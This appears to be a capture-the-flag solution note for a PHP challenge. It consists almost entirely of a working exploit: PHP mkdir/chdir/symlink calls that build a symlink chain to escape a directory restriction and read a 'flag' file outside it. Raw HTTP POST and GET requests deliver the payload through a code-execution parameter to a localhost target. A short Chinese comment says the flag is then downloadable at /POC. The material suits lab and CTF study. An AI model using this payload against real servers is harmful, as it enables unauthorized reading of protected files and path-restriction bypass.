mkdir("A");
chdir("A");
mkdir("B");
chdir("B");
mkdir("C");
chdir("C");
mkdir("D");
chdir("D");
chdir("..");
chdir("..");
chdir("..");
chdir("..");
symlink("A/B/C/D","SD");
symlink("SD/../../../../flag","POC");
unlink("SD");
mkdir("SD");

然后/POC即可下载flag文件 容器最好设置定时重启


POST / HTTP/1.1
Host: localhost:30304
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 236

1=mkdir("A");chdir("A");mkdir("B");chdir("B");mkdir("C");chdir("C");mkdir("D");chdir("D");chdir("..");chdir("..");chdir("..");chdir("..");symlink("A/B/C/D","SD");symlink("SD/../../../../flag","POC");unlink("SD");mkdir("SD");



GET /POC HTTP/1.1
Host: localhost:30304
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=1

